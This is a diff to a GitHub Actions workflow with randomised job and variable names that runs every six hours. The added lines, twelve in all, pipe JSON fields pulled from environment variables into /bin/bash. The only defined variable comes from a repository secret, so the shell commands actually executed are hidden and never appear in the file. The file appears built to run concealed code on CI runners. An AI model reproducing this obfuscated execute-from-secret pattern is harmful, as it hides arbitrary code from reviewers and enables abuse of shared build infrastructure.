@@ -1,10 +1,11 @@
 name: fanjiuzhou8190
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '20 4/6 * * *'
 
-jobs:  # 27871
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +13,18 @@ jobs:  # 27871
       - uses: actions/checkout@v4
       - name: fanjiuzhou8190
         env:
-          vdn2173: ${{ secrets.vdn2173 }}
+          wvim0: ${{ secrets.wvim0 }}
         run: |
-          echo $vdn2173 | jq -r .ly005 | /bin/bash
-          echo $h9626 | jq -r .ei6 | /bin/bash
-          echo $v6740 | jq -r .ljp2 | /bin/bash
-          echo $z8 | jq -r .ydqop448 | /bin/bash
-          echo $avqt80958 | jq -r .nis96 | /bin/bash
-          echo $drzo8807 | jq -r .oonz1622 | /bin/bash
-          echo $w5 | jq -r .luscc14392 | /bin/bash
-          echo $viuv63 | jq -r .qr86 | /bin/bash
+          echo $wvim0 | jq -r .mng82288 | /bin/bash
+          echo $blavp246 | jq -r .amf52 | /bin/bash
+          echo $wur66 | jq -r .evbw4 | /bin/bash
+          echo $vj958 | jq -r .ohutz94 | /bin/bash
+          echo $cw52885 | jq -r .qde9137 | /bin/bash
+          echo $gooks4 | jq -r .wol1 | /bin/bash
+          echo $oexbc945 | jq -r .uza1352 | /bin/bash
+          echo $yba6 | jq -r .emod672 | /bin/bash
+          echo $iaxzh507 | jq -r .nufmc7005 | /bin/bash
+          echo $ju6796 | jq -r .btjz356 | /bin/bash
+          echo $joca737 | jq -r .mys01159 | /bin/bash
+          echo $vxqn53 | jq -r .xhm161 | /bin/bash
 
